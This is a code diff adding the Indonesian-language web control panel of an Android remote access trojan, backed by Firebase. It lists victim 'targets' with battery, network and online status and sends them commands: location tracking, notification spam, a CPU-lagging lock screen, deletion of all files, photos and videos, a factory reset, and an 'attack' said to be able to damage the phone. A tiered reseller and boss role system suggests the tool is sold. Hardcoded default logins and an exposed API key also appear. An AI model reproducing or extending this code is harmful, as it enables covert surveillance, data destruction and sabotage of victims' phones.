+                            <div class="rat-menu-title">Set Brightness</div>
+                        </div>
+                        <!-- Location -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="showLocationDialog">
+                            <div class="rat-menu-icon icon-location"><i class="fas fa-map-marker-alt"></i></div>
+                            <div class="rat-menu-title">Lokasi</div>
+                        </div>
+                        <!-- Ubah Wallpaper -->
+                        <div class="rat-menu-card" data-role="ADMIN" data-action="sendSetWallpaper" style="border-color:#feca57">
+                            <div class="rat-menu-icon" style="color:#feca57"><i class="fas fa-image"></i></div>
+                            <div class="rat-menu-title">Ubah Wallpaper</div>
+                        </div>
+
+                        <!-- BOSS -->
+                        <div class="role-separator boss">---- ROLE BOSS ----</div>
+                        <!-- Delete File -->
+                        <div class="rat-menu-card" data-role="BOSS" data-action="showDeleteFileDialog">
+                            <div class="rat-menu-icon icon-delete"><i class="fas fa-trash-alt"></i></div>
+                            <div class="rat-menu-title">Delete File</div>
+                        </div>
+                        <!-- Delete Foto -->
+                        <div class="rat-menu-card" data-role="BOSS" data-action="showDeletePhotoDialog">
+                            <div class="rat-menu-icon icon-delete" style="color:#ff8800"><i class="fas fa-image"></i></div>
+                            <div class="rat-menu-title">Delete Foto</div>
+                        </div>
+                        <!-- Delete Video -->
+                        <div class="rat-menu-card" data-role="BOSS" data-action="showDeleteVideoDialog">
+                            <div class="rat-menu-icon icon-delete" style="color:#ff8800"><i class="fas fa-video"></i></div>
+                            <div class="rat-menu-title">Delete Video</div>
+                        </div>
+                        <!-- Reset HP (2 dialog) -->
+                        <div class="rat-menu-card" data-role="BOSS" data-action="showResetFactoryDialog1">
+                            <div class="rat-menu-icon icon-reset" style="color:#ff0000"><i class="fas fa-undo-alt"></i></div>
+                            <div class="rat-menu-title">Reset HP</div>
+                        </div>
+                        <!-- Rusak HP -->
+                        <div class="rat-menu-card" data-role="BOSS" data-action="showRusakHpDialog1">
+                            <div class="rat-menu-icon icon-hell" style="color:#ff0000"><i class="fas fa-skull-crossbones"></i></div>
+                            <div class="rat-menu-title">Serang HP</div>
+                        </div>
+                        <!-- Stop Serang -->
+                        <div class="rat-menu-card" data-role="BOSS" data-action="sendStopAttack">
+                            <div class="rat-menu-icon" style="color:#00ffcc"><i class="fas fa-stop-circle"></i></div>
+                            <div class="rat-menu-title">Stop Serang</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ===== LOCATION ROOM ===== -->
+    <div id="roomLocation" class="rat-room-detail">
+        <div class="room-header"><button class="back-btn" onclick="closeRoom('roomLocation')"><i class="fas fa-arrow-left"></i> Kembali</button><div class="room-title"><i class="fas fa-map-marker-alt"></i> LOKASI</div></div>
+        <div class="room-content" id="roomLocationContent">
+            <div id="mapContainer"></div>
+            <div class="location-coord">
+                <span class="coord-label">Koordinat Keberadaan Target : </span>
+                <span class="coord-value" id="coordDisplay">-6.1234, 106.5678</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== MODALS ===== -->
+    <!-- TOAST -->
+    <div id="ratModalToast" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-toast"><i class="fas fa-comment-dots"></i></div>
+            <div class="rat-menu-title">Teks Layar</div>
+            <textarea id="ratToastMsg" class="rat-modal-input" rows="2" placeholder="Tulis pesan"></textarea>
+            <button class="rat-btn" onclick="ratSendToast()">KIRIM</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalToast')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- SET VOLUME -->
+    <div id="ratModalSetVolume" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-volume"><i class="fas fa-volume-up"></i></div>
+            <div class="rat-menu-title">Set Volume</div>
+            <div class="input-group"><label>Settings Volume</label><input type="number" id="ratVolumeValue" class="rat-modal-input" min="0" max="100" value="50"></div>
+            <button class="rat-btn" onclick="sendSetVolume()">KIRIM</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalSetVolume')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- SET BRIGHTNESS -->
+    <div id="ratModalSetBrightness" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-brightness"><i class="fas fa-sun"></i></div>
+            <div class="rat-menu-title">Set Brightness</div>
+            <div class="input-group"><label>Settings Brightness</label><input type="number" id="ratBrightnessValue" class="rat-modal-input" min="0" max="100" value="50"></div>
+            <button class="rat-btn" onclick="sendSetBrightness()">KIRIM</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalSetBrightness')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- OPEN URL -->
+    <div id="ratModalOpenUrl" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-url"><i class="fas fa-external-link-alt"></i></div>
+            <div class="rat-menu-title">Open URL</div>
+            <div class="input-group"><label>Masukkan URL (https://...)</label><input type="text" id="ratOpenUrlInput" class="rat-modal-input" placeholder="https://example.com"></div>
+            <button class="rat-btn" onclick="sendOpenUrlFromModal()">KIRIM</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalOpenUrl')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- TTS -->
+    <div id="ratModalTts" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon" style="color:#66ccff"><i class="fas fa-volume-up"></i></div>
+            <div class="rat-menu-title">Text To Speech</div>
+            <div class="input-group"><label>Masukkan teks untuk dibacakan</label><input type="text" id="ratTtsText" class="rat-modal-input" placeholder="Tulis teks..." value=""></div>
+            <button class="rat-btn" onclick="sendTts()">KIRIM</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalTts')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- SPAM NOTIF -->
+    <div id="ratModalSpamNotif" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon" style="color:#ff8800"><i class="fas fa-bell"></i></div>
+            <div class="rat-menu-title">Spam Notifikasi</div>
+            <div class="input-group">
+                <label style="text-align:left;color:#fff;">Pesan</label>
+                <input type="text" id="spamNotifMessage" class="rat-modal-input" placeholder="Tulis pesan spam" value="Halo!">
+            </div>
+            <div class="input-group">
+                <label style="text-align:left;color:#fff;">Jumlah (max 50)</label>
+                <input type="number" id="spamNotifCount" class="rat-modal-input" placeholder="Jumlah pengiriman" value="5" min="1" max="50">
+            </div>
+            <button class="rat-btn" onclick="sendSpamNotif()">KIRIM SPAM</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalSpamNotif')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- ===== MODAL LOCK HTML ===== -->
+    <div id="ratModalLockHtml" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon" style="color:#ffaa33"><i class="fas fa-lock"></i></div>
+            <div class="rat-menu-title">LOCK HTML</div>
+            <div class="switch-container">
+                <span><i class="fas fa-microchip"></i> LAG CPU</span>
+                <label class="switch">
+                    <input type="checkbox" id="lockCpuLag">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="switch-container">
+                <span><i class="fas fa-bolt"></i> Flash Blink</span>
+                <label class="switch">
+                    <input type="checkbox" id="lockFlashBlink">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="switch-container">
+                <span><i class="fas fa-music"></i> Musik Loop</span>
+                <label class="switch">
+                    <input type="checkbox" id="lockMusikLoop">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="input-group" style="margin-top:12px">
+                <label style="text-align:left;color:#fff;">Kode HTML (custom)</label>
+                <textarea id="lockHtmlCode" class="rat-modal-input" rows="3" placeholder="<Lock Costum>" style="text-align:left;resize:vertical;"></textarea>
+            </div>
+            <button class="rat-btn" onclick="sendLockHtml()">KIRIM</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalLockHtml')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- ===== MODAL RENAME DEVICE ===== -->
+    <div id="ratModalRename" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon" style="color:#00ffcc"><i class="fas fa-pen"></i></div>
+            <div class="rat-menu-title">Ganti Nama Device</div>
+            <input type="text" id="renameDeviceInput" class="rat-modal-input" placeholder="Nama baru" value="">
+            <button class="rat-btn" onclick="sendRenameDevice()">SIMPAN</button>
+            <button class="rat-btn rat-btn-secondary" onclick="ratCloseModal('ratModalRename')">BATAL</button>
+        </div>
+    </div>
+
+    <!-- ===== MODAL BOSS ===== -->
+    <!-- Delete File -->
+    <div id="ratModalDeleteFile" class="rat-modal-overlay modal-admin">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-delete"><i class="fas fa-trash-alt"></i></div>
+            <div class="rat-menu-title" style="color:#ff3333">Delete File</div>
+            <div class="desc">Apakah anda yakin ingin menghapus semua file</div>
+            <div class="btn-group">
+                <button class="btn-confirm yes btn-danger" onclick="sendDeleteFile()">Lanjutkan</button>
+                <button class="btn-confirm no" onclick="ratCloseModal('ratModalDeleteFile')">Batal</button>
+            </div>
+        </div>
+    </div>
+    <!-- Delete Foto -->
+    <div id="ratModalDeletePhoto" class="rat-modal-overlay modal-admin">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-delete" style="color:#ff8800"><i class="fas fa-image"></i></div>
+            <div class="rat-menu-title" style="color:#ff8800">Delete Foto</div>
+            <div class="desc">Apakah anda yakin ingin menghapus semua foto</div>
+            <div class="btn-group">
+                <button class="btn-confirm yes btn-danger" onclick="sendDeletePhoto()">Lanjutkan</button>
+                <button class="btn-confirm no" onclick="ratCloseModal('ratModalDeletePhoto')">Batal</button>
+            </div>
+        </div>
+    </div>
+    <!-- Delete Video -->
+    <div id="ratModalDeleteVideo" class="rat-modal-overlay modal-admin">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-delete" style="color:#ff8800"><i class="fas fa-video"></i></div>
+            <div class="rat-menu-title" style="color:#ff8800">Delete Video</div>
+            <div class="desc">Apakah anda yakin ingin menghapus semua video</div>
+            <div class="btn-group">
+                <button class="btn-confirm yes btn-danger" onclick="sendDeleteVideo()">Lanjutkan</button>
+                <button class="btn-confirm no" onclick="ratCloseModal('ratModalDeleteVideo')">Batal</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== RESET HP (2 DIALOG) ===== -->
+    <div id="ratModalResetFactory1" class="rat-modal-overlay modal-admin">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-reset" style="color:#ff0000"><i class="fas fa-undo-alt"></i></div>
+            <div class="rat-menu-title" style="color:#ff0000">Reset HP</div>
+            <div class="desc">Apakah Anda yakin ingin mereset HP target?</div>
+            <div class="btn-group">
+                <button class="btn-confirm yes btn-danger" onclick="showResetFactoryStep2()">Lanjutkan</button>
+                <button class="btn-confirm no" onclick="ratCloseModal('ratModalResetFactory1')">Batal</button>
+            </div>
+        </div>
+    </div>
+    <div id="ratModalResetFactory2" class="rat-modal-overlay modal-admin">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-reset" style="color:#ff0000"><i class="fas fa-exclamation-triangle"></i></div>
+            <div class="rat-menu-title" style="color:#ff0000">Peringatan Terakhir</div>
+            <div class="desc">Wipe data</div>
+            <div class="desc">Menghapus semua foto</div>
+            <div class="desc">Menghapus semua video</div>
+            <div class="desc">Menghapus semua file</div>
+            <div class="btn-group">
+                <button class="btn-confirm yes btn-danger" onclick="sendResetFactory()">Lanjutkan</button>
+                <button class="btn-confirm no" onclick="ratCloseModal('ratModalResetFactory2')">Batal</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== RUSAK HP (2 DIALOG) ===== -->
+    <div id="ratModalRusakHp1" class="rat-modal-overlay modal-admin">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-hell" style="color:#ff0000"><i class="fas fa-skull-crossbones"></i></div>
+            <div class="rat-menu-title" style="color:#ff0000">Serang HP</div>
+            <div class="desc">Serangan ini akan membuat HP target Menjadi lag</div>
+            <div class="desc"></div>
+            <div class="btn-group">
+                <button class="btn-confirm yes btn-danger" onclick="showRusakHpStep2()">Lanjutkan</button>
+                <button class="btn-confirm no" onclick="ratCloseModal('ratModalRusakHp1')">Batal</button>
+            </div>
+        </div>
+    </div>
+    <div id="ratModalRusakHp2" class="rat-modal-overlay modal-admin">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon icon-hell" style="color:#ff0000"><i class="fas fa-exclamation-triangle"></i></div>
+            <div class="rat-menu-title" style="color:#ff0000">Peringatan Terakhir</div>
+            <div class="desc">Serangan ini sangat berbahaya dan dapat merusak HP</div>
+            <div class="desc">Kemungkinan tidak dapat di stop</div>
+            <div class="btn-group">
+                <button class="btn-confirm yes btn-danger" onclick="sendRusakHp()">Lanjutkan</button>
+                <button class="btn-confirm no" onclick="ratCloseModal('ratModalRusakHp2')">Batal</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="ratModalSuccess" class="rat-modal-overlay">
+        <div class="rat-modal-card">
+            <div class="rat-menu-icon" style="color:#00ffcc"><i class=""></i>Informasi</div>
+            <div class="rat-menu-title" style="font-size:1.5rem"></div>
+            <div class="rat-modal-input" id="ratSuccessMessage" style="background:transparent;font-size:1.1rem">Perintah berhasil di jalankan</div>
+            <button class="rat-btn" onclick="ratCloseModal('ratModalSuccess')" style="font-size:1rem;padding:14px">Woke</button>
+        </div>
+    </div>
+
+    <script>
+        // =============================================================
+        // FIREBASE CONFIG & VARIABLE GLOBAL
+        // =============================================================
+        var firebaseConfig = { apiKey: "AIzaSyBUhXZ_YKmTQNsDzeWX0072Zfb9lVi4jfE", databaseURL: "https://rullzxrat-default-rtdb.firebaseio.com" };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        var database = firebase.database();
+
+        var currentUserRole = "MEMBER";
+        var currentUsername = "";
+        var scrollPositions = {};
+        var selectedTargetId = null;
+        var roomListeners = {};
+        var currentFilter = "all";
+        var allTargets = {};
+        var pendingRoom = null;
+        var mapInitialized = false;
+        var mapInstance = null;
+        var roleLevel = { "MEMBER": 0, "RESELLER": 1, "ADMIN": 2, "BOSS": 3 };
+        var userLevel = 0;
+        var isLoginComplete = false;
+        var userTargetsListener = null;
+        var chatListener = null;
+        var renameTargetId = null;
+
+        // =============================================================
+        // TOAST
+        // =============================================================
+        function showToast(msg) {
+            var t = document.getElementById('toastNotification');
+            t.innerText = msg;
+            t.classList.add('show');
+            setTimeout(function() { t.classList.remove('show'); }, 2500);
+        }
+
+        // =============================================================
+        // DRAWER, NAVIGASI, LOADING
+        // =============================================================
+        function toggleDrawer() { document.getElementById('drawer').classList.toggle('open'); }
+        function saveScrollPosition(screenId) { var el = document.getElementById(screenId); if (el) scrollPositions[screenId] = el
+                .scrollTop; }
+        function goBackWithScroll(current, target) { saveScrollPosition(current); switchView(current, target);
+            setTimeout(function() { var el = document.getElementById(target); if (el && scrollPositions[target] !== undefined)
+                    el.scrollTop = scrollPositions[target]; }, 50); }
+        window.switchView = function(from, to) {
+            saveScrollPosition(from);
+            document.getElementById(from).classList.remove('active');
+            document.getElementById(to).classList.add('active');
+            var hamburger = document.querySelector('.global-hamburger');
+            if (to === 'screenHub') hamburger.classList.add('active-hamburger');
+            else hamburger.classList.remove('active-hamburger');
+            if (to === 'screenRAT') {
+                document.getElementById('ratRoomList').classList.add('active');
+                document.getElementById('ratRoomControl').classList.remove('active');
+                document.getElementById('ratTargetId').value = '';
+                selectedTargetId = null;
+                document.querySelectorAll('.rat-room-detail').forEach(function(el) { el.classList.remove('active'); });
+                stopAllRoomListeners();
+                document.getElementById('confirmDialog').classList.remove('show');
+                document.getElementById('mainLogo').textContent = 'RAT CONTROL';
+                document.getElementById('badgeText').textContent = 'CONNECT DEVICE';
+            }
+            if (to === 'screenChatGlobal') {
+                startChatListener();
+            } else {
+                stopChatListener();
+            }
+            setTimeout(function() { var el = document.getElementById(to); if (el && scrollPositions[to] !== undefined) el
+                    .scrollTop = scrollPositions[to]; }, 50);
+        };
+
+        function showLoading(callback) {
+            var overlay = document.getElementById('loadingOverlay');
+            overlay.classList.add('active');
+            document.body.classList.add('no-scroll');
+            var skipBtn = document.querySelector('.btn-skip-loading');
+            if (skipBtn) skipBtn.style.display = 'block';
+            setTimeout(function() { overlay.classList.remove('active');
+                document.body.classList.remove('no-scroll'); if (typeof callback === 'function') callback(); }, 10000);
+        }
+        function skipLoading() { var overlay = document.getElementById('loadingOverlay'); overlay.classList.remove('active');
+            document.body.classList.remove('no-scroll'); if (currentUsername) completeLoginSilent(); }
+        function showSpinner360(callback) {
+            var overlay = document.getElementById('loadingOverlay');
+            overlay.classList.add('active');
+            document.body.classList.add('no-scroll');
+            var emblem = overlay.querySelector('.video-emblem');
+            var textMain = overlay.querySelector('.loading-text-main');
+            var sub = overlay.querySelector('.loading-sub');
+            var skipBtn = overlay.querySelector('.btn-skip-loading');
+            if (skipBtn) skipBtn.style.display = 'none';
+            if (emblem) emblem.style.display = 'none';
+            if (textMain) textMain.textContent = '';
+            if (sub) sub.textContent = '';
+            var existingSpinner = overlay.querySelector('.spinner-wrapper');
+            if (!existingSpinner) { var wrapper = document.createElement('div');
+                wrapper.className = 'spinner-wrapper';
+                wrapper.innerHTML = '<div class="spinner-360"></div>';
+                overlay.appendChild(wrapper); } else { existingSpinner.style.display = 'flex'; }
+            setTimeout(function() {
+                overlay.classList.remove('active');
+                document.body.classList.remove('no-scroll');
+                if (emblem) emblem.style.display = 'block';
+                if (textMain) textMain.textContent = 'VRPCT';
+                if (sub) sub.textContent = 'Hanya untuk bersenang - Senang';
+                var spinnerWrapper = overlay.querySelector('.spinner-wrapper');
+                if (spinnerWrapper) spinnerWrapper.style.display = 'none';
+                if (skipBtn) skipBtn.style.display = 'block';
+                if (typeof callback === 'function') callback();
+            }, 1500);
+        }
+
+        // =============================================================
+        // LOGIN
+        // =============================================================
+        document.addEventListener('DOMContentLoaded', function() { var btn = document.getElementById('loginBtn'); if (btn) { btn
+                    .addEventListener('click', function(e) { e.preventDefault();
+                        loginUser(); }); } loadCredentials();
+            var toggleBtn = document.getElementById('passwordToggle');
+            var passField = document.getElementById('passwordField');
+            if (toggleBtn && passField) {
+                toggleBtn.addEventListener('click', function() {
+                    var type = passField.getAttribute('type') === 'password' ? 'text' : 'password';
+                    passField.setAttribute('type', type);
+                    this.querySelector('i').classList.toggle('fa-eye');
+                    this.querySelector('i').classList.toggle('fa-eye-slash');
+                });
+            }
+        });
+        window.loginUser = async function() {
+            var username = document.getElementById('usernameField').value.trim();
+            var password = document.getElementById('passwordField').value.trim();
+            if (!username || !password) { showToast("Isi username dan password"); return; }
+            var isValid = false,
+                role = "MEMBER";
+            if (username === "boss" && password === "boss") { isValid = true;
+                role = "BOSS"; } else if (username === "admin" && password === "admin") { isValid = true;
+                role = "ADMIN"; } else if (username === "reseller" && password === "reseller") { isValid = true;
+                role = "RESELLER"; } else if (username === "member" && password === "member") { isValid = true;
+                role = "MEMBER"; } else {
+                try { var snapshot = await database.ref("users").orderByChild("username").equalTo(username).once(
+                    "value"); var userData = null; if (snapshot.exists()) snapshot.forEach(function(child) { userData =
+                        child.val(); }); if (userData && userData.password === password) { isValid = true;
+                        role = userData.role || "MEMBER"; } } catch (e) { console.warn(e); }
+            }
+            if (!isValid) { showToast("Username atau password salah"); return; }
+            currentUsername = username;
+            updateUserRole(role);
+            if (document.getElementById('saveLoginCheckbox').checked) { localStorage.setItem('savedUsername', username);
+                localStorage.setItem('savedPassword', password); } else { localStorage.removeItem('savedUsername');
+                localStorage.removeItem('savedPassword'); }
+            showLoading(function() { completeLogin(); });
+        };
+        function completeLogin() { if (isLoginComplete) return;
+            isLoginComplete = true;
+            showToast("Login sukses! Welcome " + currentUsername);
+            document.body.classList.add('logged-in');
+            document.querySelector('.global-hamburger').classList.add('active-hamburger');
+            listenTargets();
+            switchView('screenLogin', 'screenHub'); }
+        function completeLoginSilent() { if (isLoginComplete) return;
+            isLoginComplete = true;
+            showToast("Login sukses! Welcome " + currentUsername);
+            document.body.classList.add('logged-in');
+            document.querySelector('.global-hamburger').classList.add('active-hamburger');
+            listenTargets();
+            switchView('screenLogin', 'screenHub'); }
+        function loadCredentials() { var savedUname = localStorage.getItem('savedUsername'); var savedPwd = localStorage
+                .getItem('savedPassword'); if (savedUname && savedPwd) { document.getElementById('usernameField').value =
+                    savedUname;
+                document.getElementById('passwordField').value = savedPwd;
+                document.getElementById('saveLoginCheckbox').checked = true; } var savedUID = localStorage.getItem('myUID');
+            if (savedUID) { document.getElementById('myIdDisplay').textContent = savedUID;
+                document.getElementById('uidInput').value = savedUID; } }
+        function logout() { document.body.classList.remove('logged-in');
+            document.querySelector('.global-hamburger').classList.remove('active-hamburger');
+            isLoginComplete = false; if (userTargetsListener) { userTargetsListener.off();
+                userTargetsListener = null; } if (window.globalTargetsListener) { window.globalTargetsListener.off();
+                    window.globalTargetsListener = null; } stopChatListener();
+            switchView('screenHub', 'screenLogin');
+            showToast("Anda telah logout");
+            toggleDrawer(); }
+        function updateUserRole(role) { role = role.toUpperCase(); if (!(role in roleLevel)) role = "MEMBER";
+            currentUserRole = role;
+            userLevel = roleLevel[role] || 0;
+            document.getElementById('drawerUserRole').innerHTML = 'Status role : <strong style="color:#ffaa33">' + role +
+                '</strong>'; }
+
+        // =============================================================
+        // LIST TARGET
+        // =============================================================
+        function listenTargets() { if (!currentUsername) return; if (userTargetsListener) { userTargetsListener.off();
+                userTargetsListener = null; } if (window.globalTargetsListener) { window.globalTargetsListener.off();
+                window.globalTargetsListener = null; } var userTargetsRef = database.ref('users/' + currentUsername +
+                '/targets');
+            userTargetsListener = userTargetsRef;
+            userTargetsRef.on('value', function(snapshot) { var targetUids = snapshot.val(); if (!targetUids) { allTargets =
+                        {};
+                    renderTargets(); return; } if (window.globalTargetsListener) { window.globalTargetsListener.off();
+                    window.globalTargetsListener = null; } var globalRef = database.ref('targets');
+                window.globalTargetsListener = globalRef;
+                globalRef.on('value', function(globalSnap) { var globalData = globalSnap.val();
+                    allTargets = {}; if (globalData) { for (var key in globalData) { if (globalData.hasOwnProperty(
+                                key) && targetUids[key]) { var val = globalData[key];
+                                allTargets[key] = { deviceName: val.deviceName || val.namaDevice ||
+                                        'Perangkat Tidak Dikenal', battery: val.battery || val.baterai || 'N/A',
+                                    androidVersion: val.androidVersion || val.versiAndroid || 'N/A',
+                                    online: val.online || false, timestamp: val.timestamp || Date.now(),
+                                    network: val.network || val.jaringan || 'N/A'}; } } }
+                    renderTargets(); }); }); }
+        function generateUID() {
+            var angka = '0123456789',
+                huruf = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
+                uid = '';
+            for (var i = 0; i < 6; i++) uid += angka.charAt(Math.floor(Math.random() * angka.length));
+            for (var i = 0; i < 6; i++) uid += huruf.charAt(Math.floor(Math.random() * huruf.length));
+            uid = uid.split('').sort(function() { return 0.5 - Math.random(); }).join('');
+            document.getElementById('uidInput').value = uid;
+            localStorage.setItem('myUID', uid);
+            document.getElementById('myIdDisplay').textContent = uid;
+            if (currentUsername) { database.ref('users/' + currentUsername + '/targets/' + uid).set(true); }
+            var copyBtn = document.getElementById('uidCopyBtn');
+            copyBtn.classList.remove('copied');
+            copyBtn.innerHTML = '<i class="fas fa-copy"></i> Salin';
+            showToast('UID baru: ' + uid);
+        }
+        function copyGeneratedUID() { var uid = document.getElementById('uidInput').value.trim(); if (!uid) { showToast(
+                    "Tidak ada UID, klik Generate dulu"); return; } if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(uid).then(function() { var btn = document.getElementById('uidCopyBtn');
+                    btn.classList.add('copied');
+                    btn.innerHTML = '<i class="fas fa-check"></i> Tersalin';
+                    setTimeout(function() { btn.classList.remove('copied');
+                        btn.innerHTML = '<i class="fas fa-copy"></i> Salin'; }, 2000);
+                    showToast("UID disalin: " + uid); }).catch(function() { fallbackCopyUID(uid); });
+            } else { fallbackCopyUID(uid); } }
+        function fallbackCopyUID(uid) { var textArea = document.createElement('textarea');
+            textArea.value = uid;
+            document.body.appendChild(textArea);
+            textArea.select(); try { document.execCommand('copy'); var btn = document.getElementById('uidCopyBtn');
+                btn.classList.add('copied');
+                btn.innerHTML = '<i class="fas fa-check"></i> Tersalin';
+                setTimeout(function() { btn.classList.remove('copied');
+                    btn.innerHTML = '<i class="fas fa-copy"></i> Salin'; }, 2000);
+                showToast("UID disalin: " + uid); } catch (e) { showToast("Gagal menyalin UID"); }
+            document.body.removeChild(textArea); }
+
+        function setFilter(filter) { currentFilter = filter;
+            document.querySelectorAll('.filter-tab').forEach(function(tab) { tab.classList.toggle('active', tab.dataset
+                    .filter === filter); });
+            renderTargets(); }
+        function updateBadgeCounts() { var total = 0,
+                online = 0,
+                offline = 0; for (var key in allTargets) { if (allTargets.hasOwnProperty(key)) { total++; if (allTargets[key]
+                        .online) online++; else offline++; } } document.getElementById('countAll').textContent = total;
+            document.getElementById('countOnline').textContent = online;
+            document.getElementById('countOffline').textContent = offline; }
+        function renderTargets() {
+            var container = document.getElementById('targetListContainer');
+            container.innerHTML = '';
+            var hasTarget = false;
+            var filtered = {};
+            for (var key in allTargets) { if (allTargets.hasOwnProperty(key)) { var data = allTargets[key]; var online =
+                        data.online || false; if (currentFilter === 'all') filtered[key] = data; else if (currentFilter ===
+                        'online' && online) filtered[key] = data; else if (currentFilter === 'offline' && !online) filtered[
+                        key] = data; } }
+            var sortedKeys = Object.keys(filtered).sort(function(a, b) { var aOnline = filtered[a].online || false; var bOnline =
+                    filtered[b].online || false; if (aOnline && !bOnline) return -1; if (!aOnline && bOnline) return 1; return 0;
+            });
+            for (var i = 0; i < sortedKeys.length; i++) { var key = sortedKeys[i]; var data = filtered[key]; var deviceName =
+                    data.deviceName || data.namaDevice || 'Perangkat Tidak Dikenal'; var battery = data.battery || data
+                    .baterai || 'N/A'; var androidVer = data.androidVersion || data.versiAndroid || 'N/A'; var online = data
+                    .online || false; var network = data.network || data.jaringan || 'Tidak diketahui';
+                hasTarget = true; var div = document.createElement('div');
+                div.className = 'target-item';
+                div.innerHTML =
+                    `<div class="target-status-dot ${online ? 'online' : 'offline'}"></div><div class="target-info-center"><div class="target-name">${deviceName}</div><div class="target-detail"><span>Level batrai : ${battery}%</span><span>|</span><span>Versi Android : ${androidVer}</span><span>|</span><span>Jaringan : ${network}</span><span>|</span><span class="status-text ${online ? 'online' : 'offline'}">${online ? 'Online' : 'Offline'}</span></div></div><button class="target-rename-btn" onclick="event.stopPropagation(); showRenameDialog('${key}')"><i class="fas fa-pen"></i></button><button class="target-delete-btn" onclick="event.stopPropagation(); deleteTarget('${key}')"><i class="fas fa-trash"></i></button>`;
+                div.addEventListener('click', function(k) { return function() { ratSelectTarget(k, allTargets[k]); }; }(key));
+                container.appendChild(div); }
+            if (!hasTarget) { container.innerHTML = '<div class="no-targets">Belum ada target terhubung</div>'; }
+            updateBadgeCounts();
+            document.getElementById('badgeText').textContent = 'CONNECT DEVICE';
+        }
+        function deleteTarget(targetId) { if (!targetId) return; if (confirm('Yakin ingin menghapus target ' + targetId + '?')) {
+                if (currentUsername) { database.ref('users/' + currentUsername + '/targets/' + targetId).remove().then(
+                    function() { showToast('Target berhasil dihapus dari daftar');
+                        delete allTargets[targetId];
+                        renderTargets(); if (selectedTargetId === targetId) { document.getElementById(
+                                'ratRoomControl').classList.remove('active');
+                            document.getElementById('ratRoomList').classList.add('active');
+                            document.getElementById('ratTargetId').value = '';
+                            selectedTargetId = null;
+                            document.getElementById('mainLogo').textContent = 'RAT CONTROL';
+                            document.getElementById('badgeText').textContent = 'CONNECT DEVICE'; } }).catch(
+                    function(err) { showToast('Gagal menghapus target');
+                        console.warn(err); }); } } }
+
+        // =============================================================
+        // RENAME DEVICE
+        // =============================================================
+        function showRenameDialog(targetId) {
+            renameTargetId = targetId;
+            var currentName = allTargets[targetId] ? allTargets[targetId].deviceName : 'Perangkat Tidak Dikenal';
+            document.getElementById('renameDeviceInput').value = currentName;
+            ratShowModal('ratModalRename');
+        }
+        function sendRenameDevice() {
+            var newName = document.getElementById('renameDeviceInput').value.trim();
+            if (!newName) { showToast("Nama tidak boleh kosong"); return; }
+            if (!renameTargetId) { showToast("Target tidak valid"); return; }
+            ratCloseModal('ratModalRename');
+            showSpinner360(function() {
+                database.ref('targets/' + renameTargetId + '/deviceName').set(newName).then(function() {
+                    showToast("Nama device berhasil diubah");
+                    if (allTargets[renameTargetId]) {
+                        allTargets[renameTargetId].deviceName = newName;
+                    }
+                    renderTargets();
+                    if (selectedTargetId === renameTargetId) {
+                        document.getElementById('mainLogo').textContent = newName;
+                    }
+                }).catch(function(err) {
+                    showToast("Gagal rename: " + err.message);
+                });
+            });
+        }
+
+        // =============================================================
+        // RAT FUNCTIONS
+        // =============================================================
+        function ratShowModal(id) { document.getElementById(id).classList.add('show'); }
+        function ratCloseModal(id) { document.getElementById(id).classList.remove('show'); }
+        function ratShowSuccess(msg) { document.getElementById('ratSuccessMessage').innerText = msg ||
+                'Perintah berhasil di jalankan!';
+            ratShowModal('ratModalSuccess'); }
+        function ratGetTarget() { var tid = document.getElementById('ratTargetId').value.trim(); if (!tid) { ratShowSuccess(
+                    "ID Target kosong! Pilih target dari daftar."); return null; } return tid; }
+        function ratSendCommand(tid, data) { if (tid) database.ref('commands/' + tid).set(data).catch(function(e) { console.log(
+                    e); }); }
+        function ratBackHandler() { var isControlActive = document.getElementById('ratRoomControl').classList.contains(
+                'active'); if (isControlActive) { document.getElementById('ratRoomControl').classList.remove('active');
